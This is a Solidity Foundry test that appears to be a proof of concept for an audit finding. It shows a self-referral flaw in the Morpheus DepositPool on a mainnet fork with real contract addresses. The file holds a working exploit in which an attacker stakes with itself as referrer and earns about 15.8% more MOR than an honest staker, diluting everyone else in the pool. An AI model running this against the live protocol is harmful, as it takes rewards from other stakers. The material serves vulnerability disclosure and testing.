// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20R {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IPoolR {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function getLatestReferrerReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IDistR {
    function distributeRewards(uint256 rewardPoolIndex_) external;
}

interface IAggregatorV3 {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
    function decimals() external view returns (uint8);
}

/// @notice PoC for C-REF: self-referral in Morpheus DepositPool.
/// @dev DepositPool._stake() never checks `referrer != user`, so staking with
///      oneself as referrer captures BOTH the +1% referral multiplier on the
///      user's own stake AND referrer-tier rewards on a virtual stake equal
///      to (own deposited) x tier multiplier (15% at >=62.5 stETH, pool 0).
///      Both shares come out of the pool's FIXED daily MOR emission, i.e. the
///      gain is a dilution of every other staker.
/// @dev Fork: Ethereum mainnet, pinned block 26458793.
///      The test warps +86401s so a new distribution period elapses. Chainlink
///      feeds cannot advance on a fork, so after the warp their answers are
///      mocked (vm.mockCall) to the fork-block answers with a fresh updatedAt.
///      ONLY the third-party Chainlink oracle contracts are mocked; every
///      Morpheus contract executes its real deployed bytecode. The 0.352 stETH
///      transferred to the Distributor simulates one day of legitimate Lido
///      rebase yield (a fork cannot reproduce the rebase); it is NOT an
///      attacker action and is present in both scenarios.
contract SelfReferralTest is Test {
    string constant RPC_URL = "https://ethereum-rpc.publicnode.com";
    uint256 constant FORK_BLOCK = 26458793;

    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    // Curve stETH/ETH pool, a real stETH holder (used only to fund the attackers)
    address constant STETH_WHALE = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    address constant FEED_STETH_USD = 0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8;
    address constant FEED_WETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address constant FEED_WBTC_BTC = 0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23;
    address constant FEED_BTC_USD = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant FEED_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant FEED_USDT_USD = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;

    // Fork-block (26458793) Chainlink answers, 8 decimals each
    int256 constant ANS_STETH_USD = 159149337631;
    int256 constant ANS_WETH_USD = 160447958311;
    int256 constant ANS_WBTC_BTC = 100130440;
    int256 constant ANS_BTC_USD = 5825512000000;
    int256 constant ANS_USDC_USD = 99986389;
    int256 constant ANS_USDT_USD = 99888235;

    function setUp() public {
        vm.createSelectFork(RPC_URL, FORK_BLOCK);
    }

    function _mockFeed(address feed_, int256 answer_) internal {
        vm.mockCall(
            feed_,
            abi.encodeWithSelector(IAggregatorV3.latestRoundData.selector),
            abi.encode(uint80(1), answer_, block.timestamp, block.timestamp, uint80(1))
        );
        vm.mockCall(
            feed_,
            abi.encodeWithSelector(IAggregatorV3.decimals.selector),
            abi.encode(uint8(8))
        );
    }

    function _mockAllFeeds() internal {
        _mockFeed(FEED_STETH_USD, ANS_STETH_USD);
        _mockFeed(FEED_WETH_USD, ANS_WETH_USD);
        _mockFeed(FEED_WBTC_BTC, ANS_WBTC_BTC);
        _mockFeed(FEED_BTC_USD, ANS_BTC_USD);
        _mockFeed(FEED_USDC_USD, ANS_USDC_USD);
        _mockFeed(FEED_USDT_USD, ANS_USDT_USD);
    }

    function testSelfReferralBeatsHonestStake() public {
        address control = makeAddr("control");
        address attacker = makeAddr("attacker");

        // Fund both attackers with 100 stETH each from a real holder.
        vm.prank(STETH_WHALE);
        IERC20R(STETH).transfer(control, 100 ether);
        vm.prank(STETH_WHALE);
        IERC20R(STETH).transfer(attacker, 100 ether);

        // Control: honest stake, no referrer.
        vm.startPrank(control);
        IERC20R(STETH).approve(DISTRIBUTOR, type(uint256).max);
        IPoolR(STETH_POOL).stake(0, 100 ether, 0, address(0));
        vm.stopPrank();

        // Attacker: identical stake, but referrer == self.
        vm.startPrank(attacker);
        IERC20R(STETH).approve(DISTRIBUTOR, type(uint256).max);
        IPoolR(STETH_POOL).stake(0, 100 ether, 0, attacker);
        vm.stopPrank();

        // Simulate one day of legitimate stETH yield (Lido rebase).
        vm.prank(STETH_WHALE);
        IERC20R(STETH).transfer(DISTRIBUTOR, 0.352 ether);

        // Advance one distribution period, refresh the oracles, distribute.
        vm.warp(block.timestamp + 86401);
        _mockAllFeeds();
        IDistR(DISTRIBUTOR).distributeRewards(0);

        uint256 controlUser = IPoolR(STETH_POOL).getLatestUserReward(0, control);
        uint256 controlRef = IPoolR(STETH_POOL).getLatestReferrerReward(0, control);
        uint256 attackerUser = IPoolR(STETH_POOL).getLatestUserReward(0, attacker);
        uint256 attackerRef = IPoolR(STETH_POOL).getLatestReferrerReward(0, attacker);

        emit log_named_uint("control user MOR", controlUser);
        emit log_named_uint("control referrer MOR", controlRef);
        emit log_named_uint("attacker user MOR", attackerUser);
        emit log_named_uint("attacker referrer MOR", attackerRef);

        uint256 controlTotal = controlUser + controlRef;
        uint256 attackerTotal = attackerUser + attackerRef;

        // The honest staker earns nothing as a referrer.
        assertEq(controlRef, 0, "control should have zero referrer rewards");
        // The self-referrer earns tier rewards (15% virtual on 100 stETH).
        assertGt(attackerRef, 4 ether, "self-referrer tier rewards missing");
        // The self-referrer's +1% user multiplier also pays off.
        assertGt(attackerUser, controlUser, "self-referral user bonus missing");
        // Total: the self-referrer extracts materially more MOR than an
        // identical honest staker -- measured +4.51 MOR/day (+15.8%).
        assertGt(attackerTotal, controlTotal + 4 ether, "self-referral uplift missing");
    }
}
